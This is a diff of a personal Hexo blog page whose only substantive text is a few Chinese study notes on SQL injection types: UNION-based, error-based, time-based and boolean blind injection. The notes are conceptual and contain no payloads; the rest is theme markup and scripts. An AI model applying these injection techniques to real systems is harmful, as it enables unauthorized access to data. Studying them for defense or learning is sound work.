+联合查询限制条件：必须由两条或两条以上的select语句组成，语句之间用关键字union分隔
+
+                  union中的每个查询必须包含相同的列
+
+不管是报错还联合注入都是基于整型和字符型注入这两种类型下的
+
+报错注入：由于配置不当，错误信息被输出到前台，导致攻击者根据报错信息进行一系列操作
+
+延时注入和布尔注入共同点：都是一个字符一个字符爆出来的，耗费时间长，都没有显示位，都要ASCII码推算  
+
+</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
     }
-  })
-}
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
 
-if (true) {
-  if (typeof Typed === 'function') subtitleType()
-  else $.getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js', subtitleType)
-} else {
-  subtitleType()
-}
-</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Wyattt</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wyattt</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
